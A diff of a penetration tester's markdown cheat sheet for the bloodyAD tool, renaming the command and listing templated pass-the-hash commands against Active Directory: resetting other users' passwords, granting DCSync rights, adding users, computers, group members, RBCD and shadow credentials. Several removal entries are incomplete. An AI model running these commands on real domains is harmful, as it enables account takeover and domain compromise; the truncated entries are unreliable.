@@ -25,31 +25,31 @@
 
 ## cross-domain actions
 ```bash
-bloodyad --host <target_dc_ip> -d <domain_fqdn> -u <user> -p  -p :<nt_hash>
+bloodyAD --host <target_dc_ip> -d <domain_fqdn> -u <user> -p  -p :<nt_hash>
 ```
 
 ## set - reset password (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
 ```
 
 ## set cross-domain - reset user password (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <target_dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
+bloodyAD --host <target_dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
 ```
 
 ## set - add/replace/delete target attribute  (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set object <target_dn> <attribute> -v <value>
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set object <target_dn> <attribute> -v <value>
 ```
 
 ## set - object onwer (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  owner <target> <owner>
 ```
 
 
@@ -57,119 +57,119 @@ bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO>
 ## add - add computer (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add computer  <computer_name|jubeaz> <computer_password|Zaebuj12345+->
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add computer  <computer_name|jubeaz> <computer_password|Zaebuj12345+->
 ```
 ## add - DCSync right (pth)
 https://github.com/CravateRouge/bloodyAD
 sAMAccountName, DN, GUID or SID of the trustee
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  dcsync <trustee>
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  dcsync <trustee>
 ```
 ## add - DNS record (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add dnsRecord   
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add dnsRecord   
 ```
 ## add - full control (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add genericAll <target> <trustee>
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add genericAll <target> <trustee>
 ```
 ## add - groupMember (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  groupMember <group_sam> <target_sam>
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  groupMember <group_sam> <target_sam>
 ```
 ## add - rbcd (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  rbcd <target>  <source>
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  rbcd <target>  <source>
 ```
 ## add - shadowCredentials (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  
 ```
 ## add - uac (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  
 ```
 ## add - user (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add user <sAMAccountName|jubeaz> <password|Zaebuj12345+-> 
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add user <sAMAccountName|jubeaz> <password|Zaebuj12345+-> 
 ```
 
 ## get - list children of an object (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get  
 ```
 ## get - DNS dump records (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get dnsDump --zone <domain_fqdn>  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get dnsDump --zone <domain_fqdn>  
 ```
 ## get - membership (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get membership <target_sAMAccountName>
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get membership <target_sAMAccountName>
 ```
 ## get - object with dacl (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get object --resolve-sd <target_sAMAccountName>
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get object --resolve-sd <target_sAMAccountName>
 ```
 ## get - search (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get search --filter '<ldap_filter|(objectClass=*)>' --attr <comma_sep_attr_list|'*'> --resolve-sd  <search_base|DC=domain,DC=tld>
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get search --filter '<ldap_filter|(objectClass=*)>' --attr <comma_sep_attr_list|'*'> --resolve-sd  <search_base|DC=domain,DC=tld>
 ```
 ## get - writable (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get writable
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get writable
 ```
 
 ## remove - DCSync (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
 ```
 ## remove - DNS record (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
 ```
 ## remove - full control (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
 ```
 ## remove - groupMember (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
 ```
 ## remove - object (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
 ```
 ## remove - rbcd (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
 ```
 ## remove - shadowCredentials (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
 ```
 ## remove - uac (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
+bloodyAD --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
 ```
 
